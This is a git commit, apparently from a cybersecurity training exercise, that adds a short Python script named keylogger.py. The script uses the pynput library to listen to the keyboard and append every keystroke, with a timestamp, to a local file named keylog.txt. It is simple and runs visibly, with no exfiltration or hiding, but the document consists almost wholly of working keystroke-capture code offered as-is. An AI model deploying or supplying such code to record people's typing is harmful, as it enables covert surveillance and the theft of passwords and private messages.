10c503751c92de1381d2afb9c06044f2617bf2a5
kalmux1 <kal.mux.cyber@gmail.com>
2024-08-21 18:29:28 +0530

    Keylogger

--- PRODIGY_CS_04/keylogger.py
+++ PRODIGY_CS_04/keylogger.py
@@ -1,2 +1,31 @@
 
 # By Kalmux
+
+from pynput import keyboard
+from datetime import datetime
+
+current_time = datetime.now()
+log_time = current_time.strftime("%Y-%m-%d %H:%M:%S")
+
+with open("keylog.txt",'a') as log:
+        try:
+            log.write(f"\n\n {log_time} \n")
+        except Exception as e :
+            print(f"An Error Occured : {e}")
+
+def keylog(key):
+    key = str(key)
+    print(key)
+    with open("keylog.txt",'a') as log:
+        try:
+            log.write(f"{key}")
+        except Exception as e :
+            print(f"An Error Occured : {e}")
+
+def listner():
+    key_listner = keyboard.Listener(on_press=keylog)
+    key_listner.start()
+    print("starting")
+    input()
+
+listner()
